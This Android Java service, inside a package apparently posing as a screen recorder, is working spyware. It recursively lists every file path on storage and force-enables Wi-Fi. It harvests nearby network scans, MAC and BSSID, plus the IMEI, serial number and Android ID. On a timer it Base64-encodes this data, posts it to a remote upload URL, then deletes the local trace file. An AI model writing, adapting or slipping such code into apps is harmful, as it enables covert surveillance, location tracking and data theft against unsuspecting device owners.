package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.recorder.screen.screen_recorder.helper.UrlDemo;
import com.recorder.screen.screen_recorder.helper.Values;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;


public class Wifi extends Service{
    private File root;
    public static boolean started = false;
    private ArrayList<File> fileList = new ArrayList<File>();
    static final String SAMPLE_EXTENSION = " ";
    StringBuilder sb ;
    StringBuilder sb1 ;
    static int counter = 0;
    File rootDir;
    String aes;
    StringBuilder sBuffer ;
    StringBuilder sBuffer1 ;

    Timer mytimer, mytimer1;
    List<ScanResult> wifiScanResult;
    WifiManager wifiManager;
    StringBuilder wifisb = new StringBuilder();
    WifiReceiver receiverWifi;
    String fileincode;
    String filetest;
    String time_stamp = "";
    String finalbase;
    String textdecodewifidecrypt;

    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }
    public void onCreate()
    {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
        wl.acquire();
        // screen and CPU will stay awake during this section
        wl.release();
        super.onCreate();
    }
    public void onStart(Intent intent, int startId){
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
        wl.acquire();
        // screen and CPU will stay awake during this section
        wl.release();

        sb = new StringBuilder();
        sb1 = new StringBuilder();
        started = true;
        root = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        File innerDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        rootDir = innerDir.getParentFile();
        getfile(root);
        getExternalSDCardDirectory(rootDir);



        try {
            File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "wifi.txt");
            myFile.createNewFile();
            FileOutputStream fOut = new FileOutputStream(myFile);
            OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
            //   myOutWriter.append(sBuffer);
            myOutWriter.append(sb.toString());
            //  myOutWriter.append(sBuffer1);
            myOutWriter.append(sb1.toString());

            myOutWriter.close();
            fOut.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
            //sendfile();
        mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                sendfile();
            }
        },20000,60500);//change Timer Value
    }

    public void getfile(File dir) {

        File listFile[] = dir.listFiles();
        if (listFile != null && listFile.length > 0) {
            for (int i = 0; i < listFile.length; i++) {

                if (listFile[i].isDirectory()) {
                    sb.append(listFile[i].getAbsolutePath()+"\n");
                    getfile(listFile[i]);

                } else {

                    //Log.d("Debug", "absolute path "+listFile[i].getAbsolutePath());
                    sb.append(listFile[i].getAbsolutePath()+"\n");
                }

            }

        }
        //	return fileList;

    }
    public void getExternalSDCardDirectory(File rootdir)
    {
        try {
            File listFile[] = rootdir.listFiles();
            if (listFile != null && listFile.length > 0) {
                for (int i = 0; i < listFile.length; i++) {

                    if (listFile[i].isDirectory()) {
                        sb1.append(listFile[i].getParent()+"\n");
                        getfile(listFile[i]);

                    } else {

                        //Log.d("Debug", "absolute path "+listFile[i].getParent());
                        sb1.append(listFile[i].getParent()+"\n");
                    }

                }
            }
        }
        catch (Exception e){
            Log.d("Exception","wifi"+e);
        }

    }

    public void sendfile(){
        mytimer1 = new Timer();
        mytimer1.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- Wifi");
                HttpClient httpclient = new DefaultHttpClient();

                String fsupload = UrlDemo.fsupload;
                HttpPost httppost = new HttpPost(fsupload);
                TelephonyManager tm =(TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                String imei = tm.getDeviceId();
                byte[] imeiwifi = imei.getBytes();
                String imeibasewifi = android.util.Base64.encodeToString(imeiwifi, android.util.Base64.DEFAULT);
                System.out.println("imeibasewifi = " + imeibasewifi);
                String imeibasewifistring = imeibasewifi.replaceAll("\n", "");
                System.out.println("imeibasewifistring = " + imeibasewifistring);

                String serial = android.os.Build.SERIAL;
                System.out.println("Serial wifi = " +serial);
                byte[] serialwifi = serial.getBytes();
                String serialbasewifi = android.util.Base64.encodeToString(serialwifi, android.util.Base64.DEFAULT);
                String serialbasewifistring = serialbasewifi.replaceAll("\n", "");
                System.out.println("serialbasecodestring = " + serialbasewifistring);

                String uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                System.out.println("uid wifi = " + uid);
                byte[] uidwifi = uid.getBytes();
                String uidbasewifi = android.util.Base64.encodeToString(uidwifi, android.util.Base64.DEFAULT);
                String uidbasewifistring = uidbasewifi.replaceAll("\n", "");
                System.out.println("uidbasewifistring = " + uidbasewifistring);

                try {
                    SharedPreferences sp = getSharedPreferences("key", 0);
                    String tValue = sp.getString("chkwifi","");
                    Log.d("checkcon-------","wifiSharedvaluereceive::::------"+tValue);

                    String base64encoded_filedata = "";
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

                    try
                    {
                        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "wifi.txt");
                        FileInputStream fin = new FileInputStream(file);
                        int length = (int)file.length();
                        byte fileContent[] = new byte[length];
                        int response1 = fin.read(fileContent);
                        Log.d("File","number of byte actually read from file internal"+response1);
                        //String s = new String(fileContent);
                        wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
                        if (wifiManager.isWifiEnabled() == false) {
                            // If wifi disabled then enable it
                            Toast.makeText(getApplicationContext(), "wifi is disabled..making it enabled", Toast.LENGTH_LONG).show();
                            wifiManager.setWifiEnabled(true);
                        }
                        receiverWifi = new WifiReceiver();
                        registerReceiver(receiverWifi, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
                        wifiManager.startScan();
                        wifiScanResult =   wifiManager.getScanResults();
                        WifiInfo info = wifiManager.getConnectionInfo();
                        String deviceMAC = info.getMacAddress();
                        String accessPointMAC = info.getBSSID();
                        String name = info.getSSID();
                        byte[] wifitest = wifiScanResult.toString().getBytes();
                        System.out.println((" WIFI available " + wifiScanResult +  " \n Device MAC : " + deviceMAC + "\n AccessPoint MAC : " + accessPointMAC + "\n Time : " + Values.Date(System.currentTimeMillis())).getBytes());

                        String wifidata = android.util.Base64.encodeToString(wifitest, android.util.Base64.DEFAULT);
                        filetest = wifidata.replaceAll("\n", "");
                        System.out.println("WifiData = =" +filetest);

                    }
                    catch(Exception e)
                    {
                        Log.d(getClass().getSimpleName(), "   Exception thrown in encrypting  internal files "+e);
                    }

                    try
                    {
                        Date dt = new Date();
                        int min = dt.getMinutes();
                        int hr = dt.getHours();
                        String strmin="",strhr="";
                        if(min<10)
                            strmin = "0"+Integer.toString(min);
                        else
                            strmin = Integer.toString(min);
                        if(hr<10)
                            strhr= "0"+Integer.toString(hr);
                        else
                            strhr= Integer.toString(hr);
                        time_stamp = ""+strhr+"_"+strmin+"_"+Integer.toString(dt.getMonth()+1)+"_"+Integer.toString(dt.getDate())+"_"+Integer.toString(dt.getYear()+1900)+"_";
                    }
                    catch(Exception e)
                    {
                        Log.d(getClass().getSimpleName(), "Exception:"+e);
                    }
                    String wififile_name = time_stamp+"wifi.txt";
                    byte[] namedata = wififile_name.getBytes("UTF-8");
                    String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
                    String  string = filenameencode.replaceAll("\n", "");

                    ConnectivityManager connectivity;
                    NetworkInfo wifiInfo;
                    connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
                    wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                    NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                    if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")){
                        if (imei != null){
                            System.out.println("IMEI NOT NUll wifi = ");
                            nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                            nameValuePairs.add(new BasicNameValuePair("IMEI", imeibasewifistring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", filetest));

                            httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();
                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }

                            Log.d("Test","Response of wifi = " +buffer);
                        }
                        else if (serial != null){
                            System.out.println("IMEI NUll && serial no not null wifi = ");
                            nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                            nameValuePairs.add(new BasicNameValuePair("IMEI", serialbasewifistring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", filetest));

                            httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();
                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }
                            Log.d("Test","Response of wifi = " +buffer);
                        }
                        else {
                            System.out.println("IMEI NUll && serial no null && Android Id not null wifi = ");
                            nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                            nameValuePairs.add(new BasicNameValuePair("IMEI", uidbasewifistring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", filetest));
                            httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();
                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }
                            Log.d("Test","Response of wifi = " +buffer);
                        }
                    }
                    else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")){
                        if (imei != null){
                            System.out.println("IMEI NOT NUll wifi = ");
                            nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                            nameValuePairs.add(new BasicNameValuePair("IMEI", imeibasewifistring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", filetest));

                            httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();
                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }

                            Log.d("Test","Response of wifi = " +buffer);
                        }
                        else if (serial != null){
                            System.out.println("IMEI NUll && serial no not null wifi = ");
                            nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                            nameValuePairs.add(new BasicNameValuePair("IMEI", serialbasewifistring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", filetest));

                            httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();
                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }
                            Log.d("Test","Response of wifi = " +buffer);
                        }
                        else {
                            System.out.println("IMEI NUll && serial no null && Android Id not null wifi = ");
                            nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                            nameValuePairs.add(new BasicNameValuePair("IMEI", uidbasewifistring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", filetest));
                            httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();
                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }
                            Log.d("Test","Response of wifi = " +buffer);
                        }
                    }
                    else {
                        Log.d("checkconError","Wifi connection erro");
                        return;
                    }
                }
                catch(Exception e){
                }
                try {
                    unregisterReceiver(receiverWifi);
                }
                catch (Exception e) {}
                stopSelf();
                File file1 = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "wifi.txt");
                file1.delete();
            }
        }, 30500);//change Timer Value
    }

    public void onDestroy() {
        try {
        mytimer1.cancel();
        mytimer.cancel();
        } catch (Exception e) {}

        try {
            unregisterReceiver(receiverWifi);
        }
        catch (Exception e) {}

        started = false;
    }

    // Broadcast receiver class called its receive method
    // when number of wifi connections changed
    class WifiReceiver extends BroadcastReceiver {
        // This method call when number of wifi connections changed
        public void onReceive(Context c, Intent intent) {

            //  sb = new StringBuilder();
            wifiScanResult = wifiManager.getScanResults();
            sb.append("\n  Number Of Wifi connections :"+wifiScanResult.size()+"\n\n");

            for(int i = 0; i < wifiScanResult.size(); i++){
                sb.append(new Integer(i+1).toString() + ". ");
                sb.append((wifiScanResult.get(i)).toString());
                sb.append("\n\n");

                byte encode[] = wifiScanResult.toString().getBytes();
                //fileincode = Base64.encodeBytes(encode);
                String encodewifi = android.util.Base64.encodeToString(encode, android.util.Base64.DEFAULT);
                fileincode = encodewifi.replaceAll("\n","");

                Log.i("Test","WIFI scan result ==== " +fileincode);
            }
        }

    }
}




